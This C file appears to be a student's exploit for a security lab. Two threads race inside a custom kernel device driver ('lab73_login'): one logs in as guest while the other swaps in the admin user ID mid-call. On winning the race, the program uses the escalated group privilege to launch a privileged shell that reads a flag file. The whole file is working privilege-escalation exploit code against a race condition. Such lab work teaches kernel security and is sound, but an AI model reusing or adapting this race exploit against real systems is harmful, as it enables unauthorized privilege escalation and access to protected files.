//gcc -o 15.bin  15.c -lpthread
#include <stdio.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <unistd.h> // for chdir
#include <stdlib.h> // for system

#define DEVFILE		"lab73_login"

#define CMD_LOGIN       100

#define LAB73WIN_ID	    1032
#define USERID_GUEST	9999
#define PASSWD_GUEST	123456
#define USERID_ADMIN	1337
#define TARGET_FILE "/home/se/Documents/labs/lab7/local_7-3/flag.txt"
//#define TARGET_FILE "/home/lab7-3/flag.txt"
#define DESTINATION_FILE "flag_copy.txt"

pthread_t tRaceExploit, tGuestLogin;
int fd;
int quit_threads = 0;


struct login_creds {
	long int userid;
	long int passwd;
};

struct login_creds login;

void PrintFlag() {
       
    execl("/bin/bash", "/bin/bash", "-p", "-c", "cat /home/lab7-3/flag.txt", NULL);
    perror("execl failed");  // only reached if execl fails

}

void *GuestLogin(void *arg) {
    pthread_t id = pthread_self();
	printf("[thread %ld] GuestLogin() Enter: GID <%d>\n", id, getegid());	
   
	ioctl(fd, CMD_LOGIN, &login);	
	printf("[thread %ld] GuestLogin() ioctl Return: GID <%d>\n", id, getegid());		
	
    if (getegid() == LAB73WIN_ID){
        quit_threads = 1;
  
		printf("[thread %ld] GuestLogin() Privileges Escalated: GID <%d>\n", id, getegid());
        sleep(5);

		printf("[thread %ld] GuestLogin() Call PrintFlag(): GID <%d>\n", id, getegid());
		PrintFlag();
		printf("[thread %ld] GuestLogin() Return from PrintFlag(): GID <%d>\n", id, getegid());
	}
    
    pthread_exit(NULL);
}


void *ExploitRaceCondition(void *arg) {
    pthread_t id = pthread_self();
	printf("[thread %ld] ExploitRaceCondition() Enter: GID <%d>\n", id, getegid());	
   
    //usleep(5000);  
	
    login.userid = USERID_ADMIN;

    ioctl(fd, 200, &login);	
	printf("[thread %ld] ExploitRaceCondition() ioctl Return: GID <%d>\n", id, getegid());	
	
	pthread_exit(NULL);

}

int main(int argc, char *argv[]) {
	
	int i = 1;
	printf("[*] call PrintFlag() (Control Should Fail): GID <%d>\n", getegid());	   //todo: delete me
	//PrintFlag();
	
    while(!quit_threads){
		printf("[i=%d] Open Device File: GID <%d>\n", i, getegid());
        fd = open("/dev/"DEVFILE, O_RDWR);
        if (fd < 0) {
            perror("[X] Device File Open Error");
            return 0;
        }
        login.userid = USERID_GUEST;
        login.passwd = PASSWD_GUEST;
        printf("[i=%d] Starting Thread tGuestLogin: GID <%d>\n", i, getegid());
        pthread_create(&tGuestLogin, NULL, GuestLogin, NULL);
		
		printf("[i=%d] Starting Thread tRaceExploit: GID <%d>\n", i, getegid());
        pthread_create(&tRaceExploit, NULL, ExploitRaceCondition, NULL);
		
		
        pthread_join(tRaceExploit, NULL);
        pthread_join(tGuestLogin, NULL);
        printf("[i=%d] Threads Joined: GID <%d>\n", i, getegid());      

        close(fd);
		i++;
	}
    
	printf("[*] Program End: GID <%d>\n", getegid());
	return 0;

}
